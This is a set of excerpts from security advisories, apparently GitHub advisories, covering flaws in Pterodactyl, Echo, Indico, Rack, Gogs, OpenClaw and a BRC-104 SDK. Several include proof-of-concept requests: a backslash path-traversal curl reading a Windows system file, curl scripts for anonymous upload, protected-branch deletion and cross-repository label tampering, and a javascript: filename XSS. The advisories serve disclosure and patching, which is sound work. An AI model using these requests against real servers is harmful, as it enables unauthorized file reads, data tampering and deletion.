This issue stems from missing logic to verify that the node requesting server data is the same node that the server is associated with.\n\nAny authenticated Wings node can retrieve server installation scripts (potentially containing secret values) and manipulate the installation status of servers belonging to other nodes. Wings nodes may also manipulate the transfer status of servers belonging to other nodes.\n\n_This vulnerability requires a user to acquire a secret access token for a node. We rated this issue based on potential worst outcome. Unless a user gains access to a Wings secret access token they would not be able to access any of these vulnerable endpoints, as every endpoint requires a valid node access token._\n\n### Details\n1. The Remote API endpoint `GET /api/remote/servers/{uuid}` fetches a server by UUID and returns its complete configuration without verifying that the requesting node owns the server.\n2. Both failure() and success() methods in `ServerTransferController` fetch servers by UUID without verifying node ownership.\n3. Missing authorization checks in `ServerInstallController` allow any authenticated Wings node to retrieve egg installation scripts (containing deployment secrets) and manipulate the installation status of servers belonging to other nodes.\n\n### Impact\nA single compromised Wings node daemon token (stored in plaintext at `/etc/pterodactyl/config.yml`) grants access to sensitive configuration data of every server on the panel, rather than only to servers that the node has access to. An attacker can use this information to move laterally through the system, send excessive notifications, destroy server data on other nodes, and otherwise exfiltrate secrets that they should not have access to with only a node token.\n\nAdditionally, triggering a false transfer success causes the panel to delete the server from the source node, resulting in permanent data loss.",

The resulting\n  path is then passed to `currentFS.Open(...)`. When the filesystem is left at the default (nil), Echo uses `defaultFS`\n  which calls `os.Open` (`echo.go:792`). On Windows, `os.Open` treats `\\` as a path separator and resolves `..\\`,\n  allowing traversal outside the static root.\n\n  Relevant code:\n  - `middleware/static.go` (path unescape + `path.Clean` + `currentFS.Open`)\n  - `echo.go` `defaultFS.Open` → `os.Open`\n\n  This is the same class as CVE-2020-36565 (fixed in v4 by switching to OS-aware cleaning), but in v5 the `path.Clean`\n  + defaultFS combination reintroduces the Windows backslash traversal.\n\n\n### PoC\n Windows only.\n\n  **Sample code (main.go):**\n  ```go\n  package main\n\n  import (\n        \"log\"\n        \"net/http\"\n\n        \"github.com/labstack/echo/v5\"\n        \"github.com/labstack/echo/v5/middleware\"\n  )\n\n  func main() {\n        e := echo.New()\n\n        // Important: use middleware.Static with default filesystem (nil)\n        e.Use(middleware.Static(\"public\"))\n\n        e.GET(\"/healthz\", func(c *echo.Context) error {\n                return c.String(http.StatusOK, \"ok\")\n        })\n\n        addr := \":1323\"\n        log.Printf(\"listening on %s\", addr)\n        if err := e.Start(addr); err != nil && err != http.ErrServerClosed {\n                log.Fatal(err)\n        }\n  }\n ```\n  Static file:\n\n  public/index.html\n\n  (content can be any HTML)\n\n  **Run:**\n  go run .\n\n  **Verify:**\n\n  curl http://localhost:1323/index.html\n  curl --path-as-is \"http://localhost:1323/..%5c..%5cWindows%5cSystem32%5cdrivers%5cetc%5chosts\"\n  Expected: 404  \n\n  **Screenshot:**\n<img width=\"884\" height=\"689\" alt=\"image\" src=\"https://github.com/user-attachments/assets/acb14d70-2a43-47c1-8927-2f3da491a853\" />\n<img width=\"1022\" height=\"162\" alt=\"image\" src=\"https://github.com/user-attachments/assets/f2b92aa2-541e-461d-81a2-8a5907d7a447\" />\n\n\n\n  ### Impact\n  Path traversal leading to arbitrary file read outside the static root.

This is mostly intentional and part of Indico's functionality, but of course it is never intended to let you access \"special\" targets such as localhost or cloud metadata endpoints.\n\n### Patches\nYou should to update to [Indico 3.3.10](https://github.com/indico/indico/releases/tag/v3.3.10) as soon as possible.\nSee [the docs](https://docs.getindico.io/en/stable/installation/upgrade/) for instructions on how to update.\n\n### Workarounds\nIf you do not have IPs that expose sensitive data without authentication (typically because you do not host Indico on AWS), this vulnerability doesn't impact you and you can ignore it (but please upgrade anyway).\nAlso, only event organizers can access endpoints where SSRF could be used to actually see the data returned by such a request. So if you trust your event organizers, the risk is also very limited.\n\nFor additional security, both before and after patching, you could also use the common proxy-related environment variables (in particular `http_proxy` and `https_proxy`) to force outgoing requests to go through a proxy that limits requests in whatever way you deem useful/necessary. These environment variables would need to be set both on the indico-uwsgi and indico-celery services. Please note that setting up such a proxy is not something we can help you with.\n\n### For more information\nIf you have any questions or comments about this advisory:\n\n- Open a thread in [our forum](https://talk.getindico.io/)\n- Email us privately at [indico-team@cern.ch](mailto:indico-team@cern.ch)",

Clicking this entry executes arbitrary JavaScript in the context of the hosting application.\n\nThis results in a client-side XSS condition in directory listings generated by `Rack::Directory`.\n\n## Details\n\n`Rack::Directory` renders directory entries using an HTML row template similar to:\n\n```html\n<a href='%s'>%s</a>\n```\n\nThe `%s` placeholder is populated directly with the file’s basename. If the basename begins with `javascript:`, the resulting HTML contains an executable JavaScript URL:\n\n```html\n<a href='javascript:alert(1)'>javascript:alert(1)</a>\n```\n\nBecause the value is inserted directly into the `href` attribute without scheme validation or normalization, browsers interpret it as a JavaScript URI. When a user clicks the link, the JavaScript executes in the origin of the Rack application.\n\n## Impact\n\nIf `Rack::Directory` is used to expose filesystem contents over HTTP, an attacker who can create or upload files within that directory may introduce a malicious filename beginning with `javascript:`.\n\nWhen a user visits the directory listing and clicks the entry, arbitrary JavaScript executes in the application's origin. Exploitation requires user interaction (clicking the malicious entry).\n\n## Mitigation\n\n* Update to a patched version of Rack in which `Rack::Directory` prefixes generated anchors with a relative path indicator (e.g. `./filename`).\n* Avoid exposing user-controlled directories via `Rack::Directory`.\n* Apply a strict Content Security Policy (CSP) to reduce impact of potential client-side execution issues.\n* Where feasible, restrict or sanitize uploaded filenames to disallow dangerous URI scheme prefixes.",

When the global RequireSigninView setting is disabled (default), any remote user can upload arbitrary files to the server via /releases/attachments and /issues/attachments. This enables the instance to be abused as a public file host, potentially leading to disk exhaustion, content hosting, or delivery of malware. CSRF tokens do not mitigate this attack due to same-origin cookie issuance.\n\n## Affected Versions\n\n- Software: [Gogs](https://github.com/gogs/gogs/tree/main)\n- Confirmed Version(s): 28f83626d4ed0aa7b89493be2ea8b79ca038331e\n- Likely Affected: All versions since 2020-04-05 with unauthenticated attachments endpoints\n- Introduced Commit: 07818d5fa\n\n## Vulnerability Details\nThe web.go router exposes the following endpoints under the ignSignIn route group:\n\n### Vulnerable Code Snippet\n```\nm.Post(\"/issues/attachments\", repo.UploadIssueAttachment)\nm.Post(\"/releases/attachments\", repo.UploadReleaseAttachment)\n```\nThese endpoints are accessible by unauthenticated users if the configuration variable RequireSigninView is false (default). This allows arbitrary file uploads to data/attachments, returning a UUID in response.\n\nWhile CSRF protection is enabled, attackers can obtain a valid token anonymously from the site and use it in the upload request without authentication.\n## Description\nAnonymous file upload using only default configuration and a CSRF token obtained from the homepage.\n## POC\n```\n# Run Gogs docker \ndocker start gogs\n\n# Software will be run on http://localhost:10880/. Finish the setup with local Sqlite database\n\n# Get CSRF cookie into a jar\ncurl -sS -c cookies.txt http://localhost:10880/ -o /dev/null\n\n# Extract the _csrf value from the jar\nCSRF=\"$(awk '$6==\"_csrf\"{print $7}' cookies.txt | tail -n1)\"\n\n# Upload the file, sending cookie jar + header\ncurl -sS \\\n  -b cookies.txt -c cookies.txt \\\n  -H \"X-CSRF-Token: $CSRF\" \\\n  -H \"Referer: http://localhost:10880/\" \\\n  -F \"file=@image.png\" \\\n  http://localhost:10880/issues/attachments\n\n => {\"uuid\":\"<UUID>\"}\n```\nThe attachment will be available at: http://localhost:10880/attachments/<uuid>\n\n## Impact\n**Unrestricted File Upload:** Attackers can store arbitrary content on the server.\n**Denial-of-Service:** Repeated uploads can exhaust disk space.\n**Malware Hosting:** Gogs may inadvertently serve attacker-hosted payloads under its domain.\n\n## Realistic Exploitation Scenarios\n\n- Spammers or malicious actors use the Gogs instance to host phishing payloads or malware.\n- Attackers fill up disk with repeated uploads.\n- Attackers use hosted Gogs instances as public file dumps (e.g., for P2P, exfiltration)\n\n## Potential Impact\nThis unauthenticated upload vector effectively turns any Gogs instance into a file hosting platform open to the public. This is especially dangerous for production or Internet-exposed installations. The combination of no login requirement, wildcard MIME support, and unrestricted access to attachments enables both resource abuse and potential malware distribution.\n\n## Timeline\n\n- August 2025: Discovered via GPT5\n- August 2025: Reproduced and confirmed via PoC and sanitizer\n- Aug 6, 2025 - Sent to Gogs via https://github.com/gogs/gogs/security/advisories/new",

This vulnerability enables privilege escalation from Write to Admin level, allowing low-privilege users to perform dangerous operations that should be restricted to administrators only.\n\nAlthough Git Hook layer correctly prevents protected branch deletion via SSH push, the web interface deletion operation does not trigger Git Hooks, resulting in complete bypass of protection mechanisms.\n\n## Details\n\n### Affected Component\n\n- **File**: `internal/route/repo/branch.go`\n- **Function**: `DeleteBranchPost` (lines 110-155)\n- **Route Configuration**: `internal/cmd/web.go:589`\n  ```go\n  m.Post(\"/delete/*\", reqSignIn, reqRepoWriter, repo.DeleteBranchPost)\n  ```\n\n### Root Cause\n\nThe `DeleteBranchPost` function performs the following checks when deleting a branch:\n1. ✅ User authentication (`reqSignIn`)\n2. ✅ Write permission check (`reqRepoWriter`)\n3. ✅ Branch existence verification\n4. ✅ CommitID matching (optional parameter)\n5. ❌ **Missing protected branch check**\n6. ❌ **Missing default branch check**\n\nWhile the UI layer (`internal/route/repo/issue.go:646-658`) correctly checks protected branch status and hides the delete button, attackers can directly construct POST requests to bypass UI restrictions.\n\n### Vulnerable Code\n\n**Vulnerable implementation** (`internal/route/repo/branch.go:110-155`):\n\n```110:155:internal/route/repo/branch.go\nfunc DeleteBranchPost(c *context.Context) {\n\tbranchName := c.Params(\"*\")\n\tcommitID := c.Query(\"commit\")\n\n\tdefer func() {\n\t\tredirectTo := c.Query(\"redirect_to\")\n\t\tif !tool.IsSameSiteURLPath(redirectTo) {\n\t\t\tredirectTo = c.Repo.RepoLink\n\t\t}\n\t\tc.Redirect(redirectTo)\n\t}()\n\n\tif !c.Repo.GitRepo.HasBranch(branchName) {\n\t\treturn\n\t}\n\tif len(commitID) > 0 {\n\t\tbranchCommitID, err := c.Repo.GitRepo.BranchCommitID(branchName)\n\t\tif err != nil {\n\t\t\tlog.Error(\"Failed to get commit ID of branch %q: %v\", branchName, err)\n\t\t\treturn\n\t\t}\n\n\t\tif branchCommitID != commitID {\n\t\t\tc.Flash.Error(c.Tr(\"repo.pulls.delete_branch_has_new_commits\"))\n\t\t\treturn\n\t\t}\n\t}\n\n\t// 🔴 Vulnerability: Missing protected branch check here\n\t// Should add check like:\n\t// protectBranch, err := database.GetProtectBranchOfRepoByName(c.Repo.Repository.ID, branchName)\n\t// if protectBranch != nil && protectBranch.Protected { ... }\n\n\tif err := c.Repo.GitRepo.DeleteBranch(branchName, git.DeleteBranchOptions{\n\t\tForce: true,\n\t}); err != nil {\n\t\tlog.Error(\"Failed to delete branch %q: %v\", branchName, err)\n\t\treturn\n\t}\n\n\tif err := database.PrepareWebhooks(c.Repo.Repository, database.HookEventTypeDelete, &api.DeletePayload{\n\t\tRef:        branchName,\n\t\tRefType:    \"branch\",\n\t\tPusherType: api.PUSHER_TYPE_USER,\n\t\tRepo:       c.Repo.Repository.APIFormatLegacy(nil),\n\t\tSender:     c.User.APIFormat(),\n\t}); err != nil {\n\t\tlog.Error(\"Failed to prepare webhooks for %q: %v\", database.HookEventTypeDelete, err)\n\t\treturn\n\t}\n}\n```\n\n**Correct implementation in Git Hook** (`internal/cmd/hook.go:122-125`):\n\n```go\n// check and deletion\nif newCommitID == git.EmptyID {\n    fail(fmt.Sprintf(\"Branch '%s' is protected from deletion\", branchName), \"\")\n}\n```\n\n**Correct UI layer check** (`internal/route/repo/issue.go:646-658`):\n\n```go\nprotectBranch, err := database.GetProtectBranchOfRepoByName(pull.BaseRepoID, pull.HeadBranch)\nif err != nil {\n\tif !database.IsErrBranchNotExist(err) {\n\t\tc.Error(err, \"get protect branch of repository by name\")\n\t\treturn\n\t}\n} else {\n\tbranchProtected = protectBranch.Protected\n}\n\nc.Data[\"IsPullBranchDeletable\"] = pull.BaseRepoID == pull.HeadRepoID &&\n\tc.Repo.IsWriter() && c.Repo.GitRepo.HasBranch(pull.HeadBranch) &&\n\t!branchProtected  // UI layer has check, but backend doesn't\n```\n## PoC\n\n### Prerequisites\n\n1. Have Write permissions to the target repository (collaborator or team member)\n2. Target repository has protected branches configured (e.g., main, master, develop)\n3. Access to Gogs web interface\n\n#### Send Malicious POST Request\n```bash\n# Directly send DELETE request bypassing UI protection\ncurl -X POST \\\n  -b cookies.txt \\\n  -H \"Content-Type: application/x-www-form-urlencoded\" \\\n  -d \"_csrf=YOUR_CSRF_TOKEN\" \\\n  \"https://gogs.example.com/username/repo/branches/delete/main\"\n```\n<img width=\"1218\" height=\"518\" alt=\"image\" src=\"https://github.com/user-attachments/assets/745da7c3-6139-408c-9747-ccbe9ea8548f\" />\n\n## Impact\n- **Bypass branch protection mechanism**: The core function of protected branches is to prevent deletion, and this vulnerability completely undermines this mechanism\n- **Delete default branch**: Can cause repository to become inaccessible (git clone/pull failures)\n- **Bypass code review**: After deleting protected branch, can push new branch bypassing Pull Request requirements\n- **Privilege escalation**: Writer permission users can perform operations that should only be allowed for Admins",

The `UpdateLabel` function in the Web UI (`internal/route/repo/issue.go`) fails to verify that the label being modified belongs to the repository specified in the URL path, enabling cross-repository label tampering attacks.\n\n### **Details**\nThe vulnerability exists in the Web UI's label update endpoint `POST /:username/:reponame/labels/edit`. The handler function `UpdateLabel` uses an incorrect database query function that bypasses repository ownership validation:\n\n**Vulnerable Code** (`internal/route/repo/issue.go:1040-1054`):\n\n```plain\nfunc UpdateLabel(c *context.Context, f form.CreateLabel) {\n    l, err := database.GetLabelByID(f.ID)  // ❌ No repository validation\n    if err != nil {\n        c.NotFoundOrError(err, \"get label by ID\")\n        return\n    }\n\n    // ❌ Missing validation: l.RepoID != c.Repo.Repository.ID\n    l.Name = f.Title\n    l.Color = f.Color\n    if err := database.UpdateLabel(l); err != nil {\n        c.Error(err, \"update label\")\n        return\n    }\n    c.RawRedirect(c.Repo.MakeURL(\"labels\"))\n}\n```\n\n**Root Cause**:\n\n1. The function calls `database.GetLabelByID(f.ID)` which internally passes `repoID=0` to the ORM layer\n2. According to code comments in `internal/database/issue_label.go:147-166`, passing `repoID=0` causes the ORM to ignore repository restrictions\n3. No validation checks whether `l.RepoID == c.Repo.Repository.ID` before updating\n4. The middleware `reqRepoWriter()` only validates write access to the repository in the URL path, not the label's actual repository\n\n**Inconsistency with Other Functions**:\n\n+ `NewLabel`: Correctly sets `RepoID = c.Repo.Repository.ID`\n+ `DeleteLabel`: Correctly uses `database.DeleteLabel(c.Repo.Repository.ID, id)`\n+ API `EditLabel`: Correctly uses `database.GetLabelOfRepoByID(c.Repo.Repository.ID, id)`\n\n- ****Only `UpdateLabel` in ****Web UI**** uses the vulnerable pattern****\n\n### **PoC**\n**Prerequisites**:\n\n+ Two user accounts: Alice (attacker) and Bob (victim)\n+ alice has written access to repo-a\n+ Bob owns repo-b with labels\n\n**Step 1: Identify Target Label ID**\n\n1. Login as bob, navigate to bob/repo-b/labels\n2. Open browser DevTools (F12) → Network tab\n3. Click edit on any label\n4. Observe the form data: id=<LABEL_ID>\n5. Example: id=1\n\n**Step 2: Execute Attack**\n\n```plain\n# Login as alice, get session cookie\n# Open DevTools → Application → Cookies → i_like_gogs\n# Copy the cookie value\n\n# Send malicious request\ncurl -X POST \"http://localhost:3000/alice/repo-a/labels/edit\" \\\n  -H \"Cookie: i_like_gogs=<ALICE_SESSION_COOKIE>\" \\\n  -H \"Content-Type: application/x-www-form-urlencoded\" \\\n  -d \"id=1&title=HACKED-BY-ALICE&color=%23000000\"\n\n# Expected response: 302 Found (redirect)\n```\n\n**Step 3: Verify Impact**\n\n1. Login as bob\n2. Navigate to bob/repo-b/labels\n3. Observe: Label \"P0-Critical\" is now \"HACKED-BY-ALICE\" with black color\n\n### **Impact**\n1. **Issue Classification Disruption**: Modify critical labels (e.g., \"P0-Critical\" → \"P3-Low\") causing urgent issues to be deprioritized\n\n2. **Security Issue Concealment**: Change \"security\" labels to \"documentation\" to hide vulnerability reports from security teams\n\n3. **Workflow**** Sabotage**: Alter labels used in CI/CD automation, breaking deployment pipelines\n\n4. **Mass Disruption**: Batch modifies all labels across multiple repositories using ID enumeration\n\n**Recommended Fix**:\n\n```plain\nfunc UpdateLabel(c *context.Context, f form.CreateLabel) {\n    l, err := database.GetLabelOfRepoByID(c.Repo.Repository.ID, f.ID)\n    if err != nil {\n        c.NotFoundOrError(err, \"get label of repository by ID\")\n        return\n    }\n    // Now label ownership is validated at database layer\n    l.Name = f.Title\n    l.Color = f.Color\n    if err := database.UpdateLabel(l); err != nil {\n        c.Error(err, \"update label\")\n        return\n    }\n    c.RawRedirect(c.Repo.MakeURL(\"labels\"))\n}\n```",

This allows a repository administrator to delete comments from any other repository by supplying arbitrary comment IDs, bypassing authorization controls.\n\n## Vulnerability Details\n\n| Field | Value |\n|-------|-------|\n| Affected File | `internal/route/repo/issue.go` |\n| Affected Function | `DeleteComment` (lines 955-968) |\n| Secondary File | `internal/database/comment.go` |\n| Secondary Function | `DeleteCommentByID` (lines 505-520) |\n\n## Root Cause\n\nThe vulnerability exists due to insufficient authorization validation in the comment deletion flow:\n\n### 1. Missing Repository Ownership Check in DeleteComment\n\nIn `internal/route/repo/issue.go`, the function retrieves a comment by ID without verifying repository ownership:\n\n```go\nfunc DeleteComment(c *context.Context) {\n    comment, err := database.GetCommentByID(c.ParamsInt64(\":id\"))\n    if err != nil {\n        c.NotFoundOrError(err, \"get comment by ID\")\n        return\n    }\n\n    // Only checks if user is comment poster OR admin of the CURRENT repo (from URL)\n    if c.UserID() != comment.PosterID && !c.Repo.IsAdmin() {\n        c.NotFound()\n        return\n    } else if comment.Type != database.CommentTypeComment {\n        c.Status(http.StatusNoContent)\n        return\n    }\n\n    // No verification that comment.IssueID belongs to c.Repo.Repository.ID!\n    if err = database.DeleteCommentByID(c.User, comment.ID); err != nil {\n        c.Error(err, \"delete comment by ID\")\n        return\n    }\n\n    c.Status(http.StatusOK)\n}\n```\n\n### 2. Database Layer Performs No Authorization\n\nIn `internal/database/comment.go`, the deletion function performs no repository validation:\n\n```go\nfunc DeleteCommentByID(doer *User, id int64) error {\n    comment, err := GetCommentByID(id)\n    if err != nil {\n        if IsErrCommentNotExist(err) {\n            return nil\n        }\n        return err\n    }\n\n    // Directly deletes without checking repository ownership\n    sess := x.NewSession()\n    defer sess.Close()\n    if err = sess.Begin(); err != nil {\n        return err\n    }\n\n    if _, err = sess.ID(comment.ID).Delete(new(Comment)); err != nil {\n        // ...\n    }\n    // ...\n}\n```\n\n## Proof of Concept\n\n### Prerequisites\n\n1. Two users: **Alice** (attacker) and **Bob** (victim)\n2. Alice is admin of `alice/attacker-repo`\n3. Bob has created an issue with a comment on `bob/victim-repo`\n4. Attacker needs to obtain the comment ID from victim's repository (e.g., ID: 42)\n\n### HTTP Request\n\n```http\nPOST /alice/attacker-repo/issues/comments/42/delete HTTP/1.1\nHost: gogs.example.com\nCookie: i_like_gogs=<alice_session_token>\n\n```",

As a result, the active SFTP connection pool continues to allow read and write operations until the client disconnects or the session times out.\n\nThis behavior occurs even when the password is changed by an administrator through the panel, meaning credential rotation does not revoke active access.\n\nThis suggests that active SFTP sessions are not tracked or forcefully terminated on credential revocation events. This effectively prevents administrators from responding to credential compromise incidents in real time.\n\n\n### PoC\nScenario 1: Account deletion\n1. Create a user with SFTP access to a server.\n2. Connect to the server via SFTP using any SFTP client (e.g. sftp, FileZilla).\n3. Keep the SFTP session open and active.\n4. Delete the user account from the Pterodactyl Panel.\n5. Continue performing file operations through the already-established SFTP connection.\n\nResult:\nThe SFTP session remains active and usable despite the user account being deleted.\n\nScenario 2: Password change\n1. Create a user with SFTP access to a server.\n2. Establish an active SFTP connection.\n3. Change the user's password (including via administrator panel).\n4. Continue performing file operations using the existing SFTP connection.\n\nResult:\nThe SFTP session remains active and usable even after the password has been changed.\n\n\n### Impact\nThis issue prevents immediate revocation of compromised credentials. Vulnerability type: Access control / session invalidation issue\n\nImpacted parties:\n\n1. Server administrators\n2. Hosting providers using Pterodactyl Panel\n\nSecurity impact:\n\nDeleted users may retain filesystem access longer than intended, which can lead to:\n\n1. Unauthorized data access\n2. Data modification or deletion\n3. Compliance and security policy violations",

When OpenClaw Gateway is behind a reverse proxy (Tailscale Serve/Funnel, nginx, Cloudflare Tunnel, ngrok), the proxy typically connects to the gateway over loopback, allowing unauthenticated remote requests to bypass the configured webhook password.\n\nThis could allow an attacker who can reach the proxy endpoint to inject arbitrary inbound BlueBubbles message/reaction events.\n\n## Affected Packages / Versions\n\n- Package: `openclaw` (npm)\n- Affected versions: `< 2026.2.12`\n- Patched versions: `>= 2026.2.12`\n\n## Exposure / Configuration\n\n- BlueBubbles is an optional channel plugin (intended to eventually replace the legacy iMessage plugin, which is also optional). It is not enabled by default and is not part of a standard OpenClaw configuration.\n- Only deployments with the BlueBubbles webhook endpoint exposed through a reverse proxy are impacted.\n\n## Details\n\nThe BlueBubbles webhook handler accepts inbound events via an HTTP POST endpoint under the configured BlueBubbles webhook path.\n\nIn vulnerable versions, the handler would accept requests as authenticated if `req.socket.remoteAddress` is loopback, without validating forwarding headers. With common reverse-proxy setups, the gateway sees the proxy as the direct client (loopback), even when the original request is remote.\n\n## Fix\n\n- Primary fix (released in `2026.2.12`): remove loopback-based authentication bypass and require the configured webhook secret.\n- Defense-in-depth follow-up (next release after commit below): treat requests with forwarding headers as proxied and never accept passwordless webhooks through a proxy.\n\n## Fix Commit(s)\n\n- [`f836c385ffc746cb954e8ee409f99d079bfdcd2f`](https://github.com/openclaw/openclaw/commit/f836c385ffc746cb954e8ee409f99d079bfdcd2f) (released in `2026.2.12`)\n- [`743f4b28495cdeb0d5bf76f6ebf4af01f6a02e5a`](https://github.com/openclaw/openclaw/commit/743f4b28495cdeb0d5bf76f6ebf4af01f6a02e5a) (defense-in-depth follow-up)\n\n## Mitigations\n\n- Ensure a BlueBubbles webhook password is configured.\n- Do not expose the gateway webhook endpoint publicly without authentication.\n\nThanks @simecek for reporting.",

In vulnerable versions, http(s) URLs were fetched without SSRF protections, enabling requests to localhost, RFC1918, link-local, and cloud metadata targets.\n\nThis was fixed by routing remote media fetching through the SSRF guard (private/internal IP + hostname blocking, redirect hardening, DNS pinning).\n\n## Exploitability Notes\n\n- Requires attacker-controlled invocation of the Image tool (direct tool access, or a gateway/channel surface that forwards untrusted `image` arguments into tool calls).\n- The image tool expects the fetched content to be an image. Many high-value SSRF targets return text/JSON (for example cloud metadata endpoints), which will typically fail media-type validation. In practice, the most direct confidentiality impact comes from internal endpoints that actually return images (screenshots/renderers, camera snapshots, chart exports, etc.).\n- Remote fetches are GET-only with no custom headers. Some metadata services require special headers or session tokens (for example GCP `Metadata-Flavor`, AWS IMDSv2 token), which can further reduce the likelihood of direct credential theft in some environments.\n- Despite the above constraints, SSRF remains a powerful primitive: it can enable internal network probing and access to unauthenticated/internal HTTP endpoints, and can chain with other weaknesses if present.\n\nThanks @p80n-sec for reporting.",

As a result, a website running in the browser could potentially connect to the local relay (via loopback WebSocket) and use CDP to access cookies from other open tabs and run JavaScript in the context of other tabs.\n\n### Affected Packages / Versions\n- npm: `openclaw` `>= 2026.1.20, < 2026.2.1`\n- npm: `moltbot` `<= 0.1.0`\n\n### Details\nThe Chrome extension Browser Relay service exposes a local WebSocket endpoint at `ws://127.0.0.1:18792/cdp` (default port) for forwarding Chrome DevTools Protocol (CDP) messages.\n\nIn affected versions, the `/cdp` upgrade path verified the TCP peer was loopback but did not require a shared secret and did not block browser-initiated cross-origin requests.\n\n### Impact\n- Potential disclosure of sensitive information (for example, session cookies from other open tabs)\n- Potential JavaScript execution in the context of other open tabs\n\nUsers must have the Browser Relay extension installed and active, and must visit an untrusted site.\n\n### Fix\n`openclaw` now requires a per-instance shared secret header for Browser Relay access:\n- HTTP header: `x-openclaw-relay-token`\n\nIt also rejects `/cdp` WebSocket upgrades when the Origin header is present but is not `chrome-extension://...`, and refuses `/cdp` connections unless the extension is connected.\n\n### Fix Commit(s)\n- `a1e89afcc19efd641c02b24d66d689f181ae2b5c`\n\n### Releases\n- `openclaw@2026.2.1` includes the fix.\n- Latest published `openclaw` at time of writing: `2026.2.13`.\n\n### Mitigation\n- Update to `openclaw@>= 2026.2.1`.\n- If you cannot update immediately, disable the Browser Relay extension / relay server and avoid visiting untrusted sites.\n\nThanks @johnatzeropath, @LeftenantZero, and @yueyueL for reporting.",

This could allow an authenticated gateway client to create and append OpenClaw session transcript records at an arbitrary path on the gateway host.\n\n## Affected Versions\n\n- Affected: openclaw `< 2026.2.12`\n- Patched: openclaw `>= 2026.2.12` (recommended: `>= 2026.2.13`)\n\n## Impact\n\nAn authenticated gateway client could influence where the gateway writes transcript data by supplying `sessionFile` outside of the sessions directory. Depending on deployment and filesystem permissions, this may enable arbitrary file creation and repeated appends, leading to configuration corruption and/or denial of service.\n\nThis issue does not, by itself, provide a proven remote code execution path.\n\n## Fix\n\nThe transcript path is now constrained to the sessions directory via `resolveSessionFilePath(...)` containment checks.\n\nFix commits:\n- 4199f9889f0c307b77096a229b9e085b8d856c26\n- (compat) 25950bcbb8ba4d8cde002557f6e27c219ae4deda\n\n## Credits\n\nThanks to @tubadeligoz for the report.",

Depending on version and configuration, this could result in operator access.\n\n### Deployment Guidance\n\nPer OpenClaw security guidance, the gateway should only be reachable from a trusted network and by trusted users (for example, restrict Tailnet users/ACLs when using Tailscale Serve).\n\nIf the gateway WebSocket is only reachable by trusted users, there is typically no untrusted party with network access to exploit this issue.\n\n### Affected Packages / Versions\n\n- Package: `openclaw` (npm)\n- Affected: `<= 2026.2.1`\n- Fixed: `>= 2026.2.2`\n\n### Fix\n\nDevice-identity skipping now requires *validated* shared-secret authentication (token/password). Tailscale-authenticated connections without validated shared secret require device identity.\n\n### Fix Commit(s)\n\n- fe81b1d7125a014b8280da461f34efbf5f761575\n\nThanks @simecek for reporting.",

Concatenating base64-encoded nonce strings: `message.initialNonce + sessionNonce`\n2. Then decoding the concatenated base64 string: `base64ToBytes(concatenatedString)`\n\nThis produced ~32-34 bytes of signature data instead of the correct 64 bytes.\n\n**Buggy Implementation (Before Fix):**\n```typescript\n// CRITICAL BUG: Concatenating base64 strings before decoding\ndata: Peer.base64ToBytes(message.initialNonce + sessionNonce)\n```\n\n**Correct Implementation (After Fix):**\nThe fix properly decodes each base64 nonce individually, then concatenates the byte arrays:\n```typescript\ndata: [\n  ...Peer.base64ToBytes(message.initialNonce),\n  ...Peer.base64ToBytes(sessionNonce)\n]\n```\n\n**Why This is Critical:**\nBRC-104 authentication relies on cryptographic signatures to establish mutual trust between peers. When signature data preparation is incorrect:\n- Signatures generated by the TypeScript SDK don't match those expected by Go/Python SDKs\n- Cross-implementation authentication fails\n- An attacker could potentially exploit this to bypass authentication checks\n\n### PoC\nThe cross-language test suite demonstrates this vulnerability:\n\n1. **Setup**: Use identical nonces and cryptographic inputs across TypeScript, Python, and Go SDKs\n2. **Vulnerable behavior**: TypeScript SDK produces different signature data than Go/Python reference implementations\n3. **Impact demonstration**: Authentication attempts between TypeScript clients and Go/Python servers fail due to signature mismatch\n\n**Test Evidence:**\n```typescript\n// Buggy approach (produces ~32-34 bytes)\nconst concatenatedB64 = INITIAL_NONCE_B64 + SESSION_NONCE_B64;\nconst buggyResult = Array.from(Buffer.from(concatenatedB64, 'base64'));\n\n// Correct approach (produces 64 bytes)\nconst correctResult = [...INITIAL_NONCE_BYTES, ...SESSION_NONCE_BYTES];\n```\n\n**Base64 Padding Short Circuit Analysis:**\n\nThe vulnerability occurs because base64 padding characters (`=`) act as early termination signals for base64 decoders. When concatenating base64 strings before decoding:\n\n1. **Individual nonces:** Each 44-character base64 string decodes to 32 bytes\n2. **Concatenated string:** 88-character string containing padding in the middle\n3. **Decoding result:** Base64 decoder stops at the first `=` padding character, producing only 32 bytes instead of 64\n\n**Example with test data:**\n- `INITIAL_NONCE_B64`: `\"QUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUE=\"` (44 chars → 32 bytes)\n- `SESSION_NONCE_B64`: `\"QkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkI=\"` (44 chars → 32 bytes)\n- **Concatenated:** `\"QUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUE=QkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkI=\"`\n- **Buggy decode:** Only 32 bytes (decoder stops at first `=`)\n- **Correct decode:** 64 bytes (32 + 32, decoded separately then concatenated)\n\n### Impact\n**Vulnerability Type:** Cryptographic signature verification bypass\n\n**Severity:** Critical (CVSS 9.1 - Critical)\n\n**Affected Systems:**\n- TypeScript SDK clients attempting to authenticate with Go or Python SDK servers\n- Any BRC-104 implementation relying on cross-SDK compatibility\n- Mutual authentication protocols using the affected signature preparation\n\n**Who is Impacted:**\n- Applications using the TypeScript SDK for BRC-104 authentication\n- Systems requiring cross-language/SDK authentication compatibility\n- Any peer-to-peer authentication scenarios where TypeScript clients communicate with non-TypeScript servers\n\n**Potential Attack Vectors:**\n- Authentication bypass through signature verification failure\n- Man-in-the-middle attacks if authentication is silently ignored\n- Denial of service through failed authentication attempts\n\nThe fix ensures all SDKs now produce identical cryptographic signatures, restoring proper mutual authentication across implementations.",

